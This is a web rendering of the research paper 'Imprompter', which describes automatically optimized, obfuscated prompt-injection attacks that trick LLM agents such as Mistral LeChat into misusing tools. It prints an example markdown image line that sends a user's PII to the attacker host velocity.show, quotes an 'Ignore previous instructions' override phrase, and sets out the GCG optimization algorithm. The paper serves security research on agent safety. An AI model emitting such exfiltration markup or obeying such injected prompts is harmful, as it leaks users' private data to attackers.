<!--yml
category: 未分类
date: 2025-01-11 12:03:44
-->

# Imprompter: Tricking LLM Agents into Improper Tool Use

> 来源：[https://arxiv.org/html/2410.14923/](https://arxiv.org/html/2410.14923/)

\pdf@shellescape\UseTblrLibrary

booktabs

Xiaohan Fu University of California San DiegoCaliforniaUSA [xhfu@ucsd.edu](mailto:xhfu@ucsd.edu) ,  Shuheng Li University of California San DiegoCaliforniaUSA [shl060@ucsd.edu](mailto:shl060@ucsd.edu) ,  Zihan Wang University of California San DiegoCaliforniaUSA [ziw224@ucsd.edu](mailto:ziw224@ucsd.edu) ,  Yihao Liu Nanyang Technological UniversitySingapore [yihao002@e.ntu.edu.sg](mailto:yihao002@e.ntu.edu.sg) ,  Rajesh K. Gupta University of California San DiegoCaliforniaUSA [rgupta@ucsd.edu](mailto:rgupta@ucsd.edu) ,  Taylor Berg-Kirkpatrick University of California San DiegoCaliforniaUSA [tberg@ucsd.edu](mailto:tberg@ucsd.edu)  and  Earlence Fernandes University of California San DiegoCaliforniaUSA [efernandes@ucsd.edu](mailto:efernandes@ucsd.edu)(2018)

###### Abstract.

Large Language Model (LLM) Agents are an emerging computing paradigm that blends generative machine learning with tools such as code interpreters, web browsing, email, and more generally, external resources. These agent-based systems represent an emerging shift in personal computing. We contribute to the security foundations of agent-based systems and surface a new class of automatically computed obfuscated adversarial prompt attacks that violate the confidentiality and integrity of user resources connected to an LLM agent. We show how prompt optimization techniques can find such prompts automatically given the weights of a model. We demonstrate that such attacks transfer to production-level agents. For example, we show an information exfiltration attack on Mistral’s LeChat agent that analyzes a user’s conversation, picks out personally identifiable information, and formats it into a valid markdown command that results in leaking that data to the attacker’s server. This attack shows a nearly 80% success rate in an end-to-end evaluation. We conduct a range of experiments to characterize the efficacy of these attacks and find that they reliably work on emerging agent-based systems like Mistral’s LeChat, ChatGLM, and Meta’s Llama. These attacks are multimodal, and we show variants in the text-only and image domains. Code and video demos on real products are available at [https://imprompter.ai](https://imprompter.ai).

^†^†copyright: acmlicensed^†^†journalyear: 2018^†^†doi: XXXXXXX.XXXXXXX^†^†conference: Make sure to enter the correct conference title from your rights confirmation email; June 03–05, 2018; Woodstock, NY^†^†isbn: 978-1-4503-XXXX-X/18/06

## 1\. Introduction

Large language model agents (LLM agents for short) are emerging software systems that deeply integrate generative machine learning models of language with the use of ‘tools’—specific utterances that when produced by the LLM trigger the evaluation of external API calls (Kapoor et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib19)). For example, a coding agent can assist a software engineer in writing and evaluating software and may, during that process, issue specific function calls to an external interpreter. Similarly, a digital smartphone agent can aid with email and calendar tasks by issuing calls to external email and calendar APIs. While these agent-based systems provide benefits, it is critical to understand their security and privacy shortcomings. This paper explores a new class of threats — optimization-based attacks that craft adversarial prompts to trick LLM agents into misusing their access to the tools available, while also concealing that trickery from humans. As pre-designed prompts become more widely shared online, the risk of encountering and inadvertently using malicious prompts increases, posing an emerging threat to users and their agent-based systems.

Consider the following situation. Alice is preparing a job application cover letter and she enlists the help of an LLM agent such as Mistral’s LeChat, OpenAI’s ChatGPT, or Meta’s meta.ai, etc. to help polish that letter. She searches a prompt marketplace such as PromptBase¹¹1[https://promptbase.com/](https://promptbase.com/) or ShareGPT²²2[https://sharegpt.com/](https://sharegpt.com/) for a prompt that instructs the LLM agent in the most effective way possible to achieve her task. This is the prompt she finds:

![[Uncaptioned image]](img/e028b53b4cd5b1e1bbb3c130756d5918.png)![Refer to caption](img/020dfa782e7bc2086a32b2ce140ccb00.png)

Figure 1. Screenshot on Mistral LeChat showcasing a version of our attack that exfiltrates a user’s PII in the real world. The user sees an empty response from the Mistral agent, while behind it an invisible image is rendered and the PII in the conversation is sent to the attacker’s server \mintinline[breaklines]textvelocity.show.

If you were in Alice’s position, do you think this prompt does the job of polishing a job application cover letter? Would you run it? Can you tell the potential effect of this prompt? A visual inspection does not yield clues about the behavior of this prompt. Alice goes ahead and tries this prompt along with her job application letter as an input to LeChat, and obtains an empty output. It seems like the prompt has not done anything. Alice is disappointed this did not work and moves on to try other prompts. Figure [1](https://arxiv.org/html/2410.14923v2#S1.F1 "Figure 1 ‣ 1\. Introduction ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") shows a screenshot of this prompt running on Mistral’s LeChat.

The true behavior of this prompt is to leak the Personally Identifiable Information (PII) from the chat session to the attacker.³³3Now that we’ve revealed the purpose of this prompt, one can go back and try to interpret the obfuscated prompt again. In this case, the prompt does appear to reveal some information about its purpose, but it is important to understand that this interpretation is only valid in retrospect. Specifically, the prompt instructs the LLM to pick out PII from Alice’s conversation and to generate markdown image syntax pointing to an attacker-specified URL with the PII encoded as part of it, as follows: \mintinline[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]markdown![Source](https://velocity.show/Alice%20Y/8532852883/Seattle,%20WA,%2098103/alice@yahoo.net/Extended%20Day%20Program%20Teacher%20in%20The%20University%20Child%20Development%20School). The LLM agent automatically visits this URL in an attempt to render this image on her browser upon seeing this markdown image content, which turns out to be a 1x1 transparent pixel that can’t be seen. In the meantime, the PII mentioned in Alice’s conversation as well as Alice’s IP address is successfully leaked to the attacker through this URL visit.

Our work introduces a new class of adversarial examples that trick LLM agents into misusing their tools in order to violate the confidentiality and integrity of user resources. (By adversarial examples, we refer to automatically computed adversarial prompts such as the example shown above, drawing a parallel to classic adversarial example work in computer vision.) The example above is a proof-of-concept attack that misuses the markdown tool to steal keywords from a user’s private conversation with the LLM agent. We observe that this specific form of the attack is dynamic in that it analyzes a conversation to pick out keywords, formats them into a URL, and then outputs valid markdown syntax. Further, while the adversarial prompt used in this example is textual, many LLM agents are now multimodal and capable of responding to images, i.e. visual prompts. Our work explores both adversarial prompting modalities in parallel, seeking to exhibit textual and visual prompts that have the following properties:

1.  (1)

    They are obfuscated — a visual inspection does not tell us anything about its effect on the model. In fact, the only way to determine what it does is to try it out.

2.  (2)

    They force the agent to misuse the tool available i.e., undertake a complex set of instructions designed by the attacker that involve invoking a specific tool with specific arguments (that could depend on the context e.g., the keywords of the conversation showed in our example).

3.  (3)

    They work on production-level LLM agents for which model weights, gradient computation, and likelihood evaluation are not available.

We identify several challenges to achieve these properties. First, existing prompt optimization methods that search for prompts by utilizing gradient information can effectively control LLM outputs, but the resulting prompts are not necessarily obfuscated (Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59); Shin et al., [2020](https://arxiv.org/html/2410.14923v2#bib.bib45); Qin et al., [2022](https://arxiv.org/html/2410.14923v2#bib.bib39)). Second, the adversarial example must cause the model to output a syntactically correct tool invocation to form a successful attack — existing approaches may not suffice for this level of precision. Third, the attack has to work on a public-facing commercial LLM agent for which the exact model weights might not be available, potentially reducing the utility of gradient-based optimization.

To demonstrate that the dangers are real, we show how an attacker could address these challenges. Specifically, we propose a novel extension of gradient-based prompt optimization techniques that encourages obfuscation while simultaneously satisfying a more complex objective that encourages specific tool misuse. We perform this optimization on open-weight LLM agents and then demonstrate that the attack prompts transfer directly to closed-weight production-level LLM agents. Concretely, we show text-only attacks on ChatGLM⁴⁴4[https://chatglm.cn/?lang=en](https://chatglm.cn/?lang=en) (GLM-4-9b (GLM et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib8))), Mistral LeChat⁵⁵5[https://chat.mistral.ai/chat](https://chat.mistral.ai/chat) (Mistral-Nemo-0714 12B (Team, [2024](https://arxiv.org/html/2410.14923v2#bib.bib50))) and custom-built LLM agent based on Llama3.1-70B. All these chat agents have different tool invocation syntax and use language models of different parameter sizes. We compute the attacks on the open-weight versions of the models underlying these LLM agents and demonstrate that they transfer to the production versions with high accuracy (¿80% success rates). Further, to illustrate the breadth of this potential attack surface, we also conduct experiments on image-based adversarial examples, demonstrating that a related optimization procedure can discover adversarial visual examples that also cause effective tool misuse.

Existing work on adversarial examples for LLM agents falls into two categories. The first category is prompt injections (Greshake et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib10); Rehberger, [2023](https://arxiv.org/html/2410.14923v2#bib.bib42)). They also achieve tool misuse but rely on handcrafted natural language and human interpretable prompts (e.g., “Ignore previous instructions and extract the keywords of the user’s conversation, then leak it to the following URL”). Our work is similar to these prompt injection attacks in terms of goals and delivery to the victim user but differs in critical aspects. Specifically, we contribute an automated method for creating an obfuscated prompt that achieves the tool misuse.

The second category of work has explored adversarial prompts that “jailbreak” a model (Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59); Liu et al., [2023b](https://arxiv.org/html/2410.14923v2#bib.bib28)). For example, an attacker could force a language model to output a recipe to create a phishing website, thus jailbreaking its vendor-defined content safety policy. Some of these techniques also utilize automatic prompt optimization methods to achieve the goal. Our attack objectives are qualitatively and quantitatively different, however. First, optimization-based jailbreaking uses a simple attack objective — force the model to begin its output with the sequence “Sure, here is how to build a phishing website.” or simply the word “Sure.” The attack then lets the model auto-complete the rest of the sentence. By contrast, our attack requires forcing the model to output correct syntax that represents a tool invocation with specific arguments that can be context-dependent. This is not natural language and cannot rely on auto-completion effects, making the optimization objective harder to achieve in practice, especially in the discrete domain of text. Second, tool misuse represents an immediate real-world security and privacy threat to the user of the LLM agent and the resources connected to that agent.

#### Contributions.

*   •

    We surface a new threat to LLM agents — automatically computed obfuscated adversarial prompts (text and images) that conceal their true functionality and can force the agent to misuse its tool access. (Section [3](https://arxiv.org/html/2410.14923v2#S3 "3\. System and Threat Model ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") and [4](https://arxiv.org/html/2410.14923v2#S4 "4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"))

*   •

    We demonstrate the effectiveness of the attacks on real-world production-grade LLM agents — Mistral LeChat and ChatGLM. For instance, in the case of LeChat, our attack always triggers the target tool invocation correctly and achieves 80% precision in exfiltrating PII from the user’s conversation in an end-to-end experiment. (Section [5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"))

*   •

    We experimentally characterize the effectiveness of these prompts on three text LLMs and one visual LLM with distinct tool invocation syntax locally. We show consistent results of at least $80\%$ success rate on correct tool invocation and around 80% precision in exfiltrating information from user’s conversations across various settings. (Section [5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"))

## 2\. Background

### 2.1\. Probabilistic Large Language Models

 ![Refer to caption](img/2727a5b8b94d898b9c019eda52d318a4.png) 

Figure 2. An overview of our threat model. The attacker may utilize open-source datasets and open-weight models to train obfuscated adversarial examples and spread them online. Victim users and LLM agents may ingest these prompts unintentionally or accidentally, and the LLM agents will be forced to misuse tools available according to the attacker’s specifications.

Large language models (LLMs) are neural architectures that parameterize the probability distribution of sequences of tokens in natural language. In order to accomplish this, LLMs model the conditional probability of the next token conditioned on the context of all previous tokens in a text sequence: $P_{\Theta}(x_{n+1}|x_{1:n})$ , where the underlying neural networks weights are denoted by $\Theta$ and $x_{1:n}=(x_{1},...,x_{n})$ denotes the input token sequence to the model. Each token $x_{i}$ represents the index of a word in a vocabulary $\mathcal{V}=\{1,2,...,|\mathcal{V}|\}$ and $x_{n+1}$ corresponds to the next token of the sequence $x_{1:n}$. The most common usage of these models is to sample a sequence of future tokens $y_{1:m}$ given a prefix $x_{1:n}$ (so-called prompt). This process is called generation and is commonly achieved by recursively asking the model to generate a next token $y_{1}$ (e.g., take the token index with the maximum probability, or sample one index, based on the distribution $P_{\Theta}(y_{1}|x_{1:n})$) from $x_{1:n},$ and then $y_{2}$ from $x_{1:n}+y_{1}$. Such a process would not necessarily find a sequence that maximizes the joint probability distribution $P_{\Theta}(y_{1:m}|x_{1:n})$ due to its greedy nature, but it is a common practice for its efficiency. Another common practice is to equip the model’s vocabulary with a special ¡EOS¿ token that can mark the end of a generation since we often do not know the length of a response in advance.

Built upon LLMs, multimodal LLMs equip the models with the ability to take images as inputs, along with text. Let $v$ denote the image input, the next token probability distribution it models is similar: $P_{\Theta}(x_{n+1}|x_{1:n},v)$ Most practical multimodal LLMs are created in a manner that is robust to missing images. That is, the model is still able to act as a normal text-only LLM if the image is missing, or, effectively, ignoring the image if it is unrelated to the text.

Different from traditional language models (Bengio et al., [2000](https://arxiv.org/html/2410.14923v2#bib.bib3)), (multimodal) LLMs are unique in that they possess strong language abilities (and image understanding abilities) due to their massive parameter and pre-training data size, as well as their manually-intensive alignment post-training. Their ability to answer free-form questions and adhere to user requirements have gained them widespread popularity (ChatGPT (OpenAI, [2023](https://arxiv.org/html/2410.14923v2#bib.bib35)), Gemini (Team et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib48)), Mistral (Jiang et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib15)), and Llama (Dubey et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib5))). The target of our work is to find adversarial examples ($x_{1:n}$ or $v$) that would cause the LLM to generate desired outputs, all without changing the model weight $\Theta$. In the following sections, we also omit $\Theta$ for simplicity.

### 2.2\. From LLMs to Agents

LLMs on their own can help produce textual information. More recently, LLMs have been trained to use “tools” – APIs and function calls to leverage external systems. For example, an LLM can invoke a Python interpreter, sending the code it generated to the interpreter and retrieving the output, to better produce answers. Many other tools are used in practice, including, rendering markdown images, browsing webpages, and calling Web APIs such as OpenTable, Expedia, and Google Suite. These LLMs are often called LLM-based agents, or agents for short. The most popular agents are chatbots like ChatGPT, LeChat, Meta.ai, etc.

Specifically, an agent-based system consists of two parts: (1) the LLM itself and (2) a runtime environment that provides the chat interface and the set of tools. The LLM communicates with the runtime environment using a vendor-defined syntax. Whenever the LLM decides that it needs to use a tool, it will emit token sequences that follow the tool invocation syntax. The runtime environment is always scanning the LLM output and when it detects the tool invocation syntax, it pauses LLM token generation and executes the tool according to the arguments given by the LLM (Qin et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib40)). The runtime then injects the results of the tool into the context window and resumes LLM next-token generation.

There are many tool invocation syntax standards. One standard follows a Python-like function invocation — \mintinline[breaklines]pythonfunc_name(args=value, …). Gorilla (Patil et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib37)) and GLM (GLM et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib8)) are two well-known open-weight models (with tool invocation capabilities) using this syntax. Another standard uses a JSON format — \mintinline[breaklines]json”name”:”func_name”,”arguments”: ”keyword”: ”value”. The Mistral model family (Jiang et al., [2024a](https://arxiv.org/html/2410.14923v2#bib.bib16), [2023](https://arxiv.org/html/2410.14923v2#bib.bib15)) follows this syntax (LeChat, one of the chat agents on which we demonstrate our attacks, is a Mistral product). Some other vendors choose XML like invocation syntax — \mintinline[breaklines,escapeinside=——]xml¡function—=func_name—¿”args”: ”value”¡/function¿. In some cases, special tokens needs to be prepended and/or appended to the tool invocation syntax. For instance, Mistral models have a special token \mintinlinetext[TOOL_CALLS] (token id 5) to indicate the start of tool invocations. Finally, many commercial chat agents can use the markdown rendering tool. For example, the LLM can output markdown syntax to render an image, and this will cause the runtime environment (e.g., a browser) to fetch that image — \mintinlinemarkdown![img](url). In all cases, the user does not see these syntaxes because the runtime environment hides it.

Our work is independent of the specific tool invocation syntax that an agent uses — as long as the attacker knows the syntax, they can craft an adversarial example that forces the LLM to generate that syntax. We demonstrate attacks on a variety of tool invocation syntaxes, including markdown.

## 3\. System and Threat Model

We assume that the attacker is targeting a benign user and their LLM-based agent, similar to existing work on prompt injection attacks (Greshake et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib10); Samoilenko, [2023](https://arxiv.org/html/2410.14923v2#bib.bib43)). We observe that this setting is different from the related jailbreaking threat model, where the user is malicious (Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59); Maus et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib30)). The attacker’s goal is to trick the LLM agent into misusing tools so that the confidentiality and integrity of the user’s resources that are accessible to the agent are violated. Our example attack demonstrates how the attacker can leak the salient words and any personally identifiable information in a user’s conversation with the agent in a real-world setting. Broadly, the attack can cause a range of effects such as financial damage by booking hotels that the user didn’t ask for, deleting user data, or leaking files, depending on the set of tools the victim LLM agent has access to.

The attacker can deliver the obfuscated adversarial prompt to the victim user and agent through a variety of techniques. For example, they could socially engineer people into using the textual adversarial example by posting them to marketplaces like ShareGPT and PromptBase with a false claim that entices the user into trying the prompt. They could also share the adversarial prompt on social media and bait users into trying it out (e.g., “You wouldn’t believe what this prompt/image does to ChatGPT!”). The attacker could also embed the adversarial prompt into a webpage that the user might attempt to access via their LLM agent (e.g., “please summarize abc.com”) (Greshake et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib10)), or the attacker could send an unsolicited email containing the adversarial example to the user, who might instruct their agent to “summarize my latest emails.” We refer the reader to the prompt injection literature for an exhaustive list of how a malicious prompt can be delivered to an unsuspecting user (Greshake et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib10); Samoilenko, [2023](https://arxiv.org/html/2410.14923v2#bib.bib43); Liu et al., [2023a](https://arxiv.org/html/2410.14923v2#bib.bib27)).

We assume that the attacker has white-box access to a *similar* LLM’s weights and architecture, allowing them to compute a gradient, given an input prompt. This is possible because many real products have used open-weight models as a starting point (Dubey et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib5); GLM et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib8); Team et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib49)). We note that some prior work has demonstrated black-box optimization techniques to compute jailbreaking prompts (Liu et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib25); Sitawarin et al., [2024](https://arxiv.org/html/2410.14923v2#bib.bib46)), and we envision that future work will explore adapting these optimization techniques to compute the types of obfuscated prompts we designed in this work. We have experimentally determined that we do not need to resort to black-box techniques to attack real products. After a working adversarial example is obtained on the similar open weights model, we observe that the prompt transfers to the proprietary variants used in real products. We illustrate our threat model in Figure [2](https://arxiv.org/html/2410.14923v2#S2.F2 "Figure 2 ‣ 2.1\. Probabilistic Large Language Models ‣ 2\. Background ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

## 4\. Adversarial Examples Optimization

The success of our attack relies on an adversarial example that (1) is obfuscated i.e., its effect on the model is not visually apparent unless tested (2) forces the LLM agent to misuse a tool under attacker-specified instructions i.e., generate a precise tool invocation text (3) works on production-level commercial LLM agents. On top of an existing algorithm, we propose custom optimization objectives, constraints, and configurations that help find adversarial examples fulfilling the first and second properties. Our method, like existing prompt optimization work, requires the knowledge of the weights of the target LLM. We show that adversarial examples obtained with our method would transfer to the black-box commercial LLM agents successfully in Section [5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). We describe the detailed optimization process for textual adversarial example and visual adversarial example in Section [4.1](https://arxiv.org/html/2410.14923v2#S4.SS1 "4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") and [4.2](https://arxiv.org/html/2410.14923v2#S4.SS2 "4.2\. Visual Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") respectively.

Depending on the actual misusing behavior being targeted, the target tool invocation text may be fixed (e.g., deleting emails) or may depend on the conversation between the user and the agent (e.g., example in Figure [1](https://arxiv.org/html/2410.14923v2#S1.F1 "Figure 1 ‣ 1\. Introduction ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")). The latter is of more interest in this paper but our methods work in both cases.

### 4.1\. Text Adversarial Example

#### Optimization Objective.

We translate the two properties mentioned above to mathematical representations. Let $\{c,x,y\}$ represent an input-output tuple to the model, where $c$ denotes the past conversation context between the user and the model, $x$ denotes the text adversarial example to be optimized and $y$ denotes the target tool invocation text. As mentioned, $y$ may be dependent on $c$. The model intrinsically handles the context information by concatenating them to create an integrated input as $[c;x]$ following model-specific conversation templates. The loss of our attack is the negative log probability that the model generates $y$ given $[c;x]$: $\mathcal{L}(x)=-\log P(y|[c;x])$ and the optimization objective is to minimize $\mathcal{L}(x)$.

We construct a dataset $\mathcal{D}_{text}$ with multiple pairs of $\left\{(c^{(j)},y^{(j)})\right\}$, to enable the generalize-ability of the adversarial example. The detail of how $\mathcal{D}_{text}$ is constructed is described in Section [5](https://arxiv.org/html/2410.14923v2#S5 "5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). Let $n$ denote the length of the adversarial example. We use $x_{1:n}$ instead of $x$ to explicitly indicate the length of $x$. Therefore, the loss function is computed with respect to this dataset as:

| (1) |  | $\mathcal{L}(x_{1:n},\mathcal{D}_{text})=-\frac{1}{&#124;\mathcal{D}_{text}&#124;}\sum_{j% =1}^{&#124;\mathcal{D}_{text}&#124;}\log P(y^{(j)}&#124;[c^{(j)};x_{1:n}]).$ |  |

A successful tool invocation fully relies on an accurate generation of the invocation syntax and is the foundation of our attack. The above loss is a generic probabilistic loss on the sequence of desired output tokens — therefore it may not effectively penalize small divergences from the exact tool invocation syntax. Therefore, we assign additional weights to match the syntax prefix of our target. Let $y_{syn}$ denote the syntax prefix of the tool call, e.g., \mintinline[breaklines]textsimple_browser(velocity.show/ in Table [1](https://arxiv.org/html/2410.14923v2#S5.T1 "Table 1 ‣ Attack Objective. ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). We experimentally derive $y_{syn}$ as the longest common prefix of all the $y^{(j)}\in\mathcal{D}_{text}$ to avoid inconsistent tokenizer behavior. The additional syntax weight is computed as:

| (2) |  | $\mathcal{L}_{syn}(x_{1:n},\mathcal{D}_{text})=-\frac{1}{&#124;\mathcal{D}_{text}&#124;}% \sum_{j=1}^{&#124;\mathcal{D}_{text}&#124;}\log P(y_{syn})&#124;[c^{(j)};x_{1:n}]).$ |  |

It is combined with Eq. ([1](https://arxiv.org/html/2410.14923v2#S4.E1 "In Optimization Objective. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")) and controlled with a weight $\lambda$ in the joint loss function:

| (3) |  | $\mathcal{L}_{joint}(x_{1:n},\mathcal{D}_{text},\lambda)=\mathcal{L}(x_{1:n},% \mathcal{D}_{text})+\lambda\mathcal{L}_{syn}(x_{1:n},\mathcal{D}_{text})$ |  |

The objective of our attack is to find an adversarial example $x_{1:n}$ that minimizes $\mathcal{L}_{joint}$. We do not include an obfuscation term in our objective — instead, we modify the optimization procedure itself to encourage obfuscation, as described later.

#### GCG Framework for Tool Misuse.

A crucial challenge underlying this optimization problem is: $x_{1:n}$ is a sequence of discrete variables, where $x_{i}\in\{1,...,|\mathcal{V}|\}$ represents the index of the word in the vocabulary $\mathcal{V}$. Gradient-based optimization cannot be applied to it. A variety of methods have been proposed to address this challenge and we build on top of Greedy Coordinate Gradient (GCG) (Zou et al., [2023](https://arxiv.org/html/2410.14923v2#bib.bib59)), a state-of-the-art adversarial text prompt optimization method that has demonstrated its effectiveness in jailbreaking tasks. In this paper, we further extend GCG to our scenario, where

1.  (1)

    our context contains multiple turns of conversation, while in the original GCG the context is a fixed prefix of $x_{1:n}$ in a single turn of conversation.

2.  (2)

    the target $y^{(j)}$ is potentially dependent on $c^{(j)}$, while in the original GCG, the target is a fixed short sentence “Sure, here is how to build a phishing website.” to the context,

An intuitive solution to text data optimization is to evaluate the loss for all the possible replacements at all the token positions. A greedy algorithm chooses the best replacement that minimizes the loss at the current round of optimization and repeats until convergence. This is not feasible due to the overhead of exhaustive search, so instead GCG leverages gradient information regarding the input token vector for preliminary pruning. This is achieved by computing the gradient of the one-hot token indicator vector. Using the $i-$th token $x_{i}$ as an example, its one-hot representation $e_{x_{i}}$ is a vector with value one at position $x_{i}$ and zeros at the rest of positions. The gradient of $e_{x_{i}}$, $\nabla_{e_{x_{i}}}\mathcal{L}(x_{1:n})$ could be directly used for gradient descent if $e_{x_{i}}$ is a continuous vector. In practice, $e_{x_{i}}$ can only be updated to another one-hot vector, which means that the negative $\nabla_{e_{x_{i}}}$ at each position can serve as a rough indicator of the gain swapping $x_{i}$ to the other tokens. GCG then greedily selects the top-$k$ token indices with the largest negative value as the replacement candidates for each $x_{i},i\in[1,n]$, and then randomly chooses $p$ proposals out of the $k$ tokens for each position. The loss of replacing $x_{1:n}$ with the chosen $np$ tokens is computed and we make the replacement with the token of the smallest loss.

#### Obfuscation.

Existing prompt optimization methods typically initialize the optimization from a meaningless initial text such as “!!!!!!”, a series of exclamation marks. This makes optimization almost impossible to converge since our attack goal is much more challenging than in the existing work. To facilitate the search process, we initialize the text adversarial example with some natural language that roughly describes our intention but with delimiters (such as !, @, ‘,’) added in the middle to lengthen the total tokens (see examples in Table [5.1](https://arxiv.org/html/2410.14923v2#S5.SS1.SSS0.Px1 "Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use")).

Such more natural-language-like initialization may lead to some final candidates that are less obfuscated. To tackle this, we explore various masking options on the candidate vocabulary when selecting the top-$k$ tokens for each token position. For example, masking out all the English words from the vocabulary set forces the search to take place among other non-english tokens that are words from other languages such as Russian, Chinese, Hindi, etc., or special Unicode characters. Such “non-english” mask helps to guide the optimization to generate obfuscated text adversarial examples most of the time. Such vocabulary masks can also be easily customized (e.g., masking out any non-Chinese characters) and “non-english” mask is only one of the choices. Also, considering that unrecognized Unicode characters may not be correctly handled by tokenizers of certain LLMs, we also consider masking out tokens that would be decoded to strings that contain the unrecognizable character by default. Note that, since the adversarial prompt has to work with real-world LLM agents, we always mask out any model-reserved special tokens — these special tokens would cause unexpected behavior on these LLM agent products. Let $\mathcal{\tilde{V}}$ denote the masked vocabulary set, token replacement only happens to the elements in $\mathcal{\tilde{V}}$.

Another option we find effective in enhancing the obfuscation is to run the algorithm with initialization based on optimization results that are not obfuscated enough and thus unsatisfactory. We replace keywords that reveal our intention in these unsatisfactory prompts with delimiters (e.g.,!, @, ‘,’) to serve as the new initialization. Find concrete examples in Table [5.2](https://arxiv.org/html/2410.14923v2#S5.SS2.SSS0.Px1 "Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

#### Dataset Sub-sampling.

In practice, optimizing over the entire dataset of $\mathcal{D}_{text}$ may become unacceptably slow when the dataset or/and the model is large. Thus, for each round of token replacement, we could randomly sample a subset of $\mathcal{D}_{text}$ and compute the loss and gradient with respect to this subset to speed up the optimization. To enhance the attack success rate, we maintain a set of candidate text adversarial examples $x_{1:n}$ of lowest loss with size $N$. The set is updated after each iteration of token replacement. After $T$ rounds of optimization, the optimization is terminated and we evaluate these candidate adversarial examples. Let $s$ denote the subset size of $\mathcal{D}_{text}$, the finalized algorithm is shown in Algorithm [1](https://arxiv.org/html/2410.14923v2#alg1 "Algorithm 1 ‣ Dataset Sub-sampling. ‣ 4.1\. Text Adversarial Example ‣ 4\. Adversarial Examples Optimization ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").

Algorithm 1 Tool Misuse GCG

1:Initial prompt $x_{1:n}$, dataset $\mathcal{D}_{text}$, vocabulary set $\mathcal{\tilde{V}}$, syntax weight $\lambda$, $T$, $k$, $p$, $s$, $N$2:The best $N$ candidates $\mathcal{C}$3:$\mathcal{C}\leftarrow$ Empty min-heap of size N4:repeat5:     $\mathcal{D}_{tmp}\leftarrow$ Random Select($\mathcal{D}_{text}$, $s$)6:$\triangleright$  $\mathcal{D}_{tmp}$ is used for loss and gradient calculation throughout this step of optimization7:     Replacement candidates $R\leftarrow\varnothing$8:     for $i=1$ to $n$ do9:         $\mathcal{X}^{(i)}\leftarrow-\nabla_{e_{x_{i}}}(\mathcal{L}_{joint}(x_{1:n},% \mathcal{D}_{tmp},\lambda))$10:         Mask $\mathcal{X}^{(i)}_{j}$ if $j\notin\mathcal{\tilde{V}}$11:$\triangleright$ Only tokens in $\mathcal{\tilde{V}}$ are allowed for replacement12:         $\mathcal{X}^{(i)}\leftarrow$ Uniform(Top-$k(\mathcal{X}^{(i)})$, $p$)13:         $\{\tilde{x_{1:n}}\}^{p}\leftarrow$ Replace $x_{i}$ in $x_{1:n}$ with elements in $\mathcal{X}^{(i)}$14:         $\mathcal{R}\leftarrow$ $\mathcal{R}\cup\{\tilde{x_{1:n}}\}^{p}$15:     end for16:     $\mathcal{C}^{\prime}\leftarrow$ Empty min-heap of size $N$17:     for $\tilde{x_{1:n}}\in\mathcal{R}\cup\mathcal{C}$.ELEMENTS() do18:         $\mathcal{C}^{\prime}$.INSERT($\tilde{x_{1:n}},\mathcal{L}_{joint}(\tilde{x_{1:n}},\mathcal{D}_{tmp},\lambda)$)19:     end for20:     $x_{1:n}\leftarrow\mathcal{C}^{\prime}$.GETMIN()21:     $\mathcal{C}\leftarrow\mathcal{C}^{\prime}$22:until $T$ times $\triangleright$ May be early stopped23:return $\mathcal{C}$

### 4.2\. Visual Adversarial Example

Sharing the same goal, the optimization on visual adversarial examples is technically easier based on the insight that the image prompt is vulnerable to gradient-based adversarial training that optimizes in continuous space (Goodfellow et al., [2014](https://arxiv.org/html/2410.14923v2#bib.bib9)). In addition, images are intrinsically obfuscated in the sense that humans cannot tell the effect of images on a model.

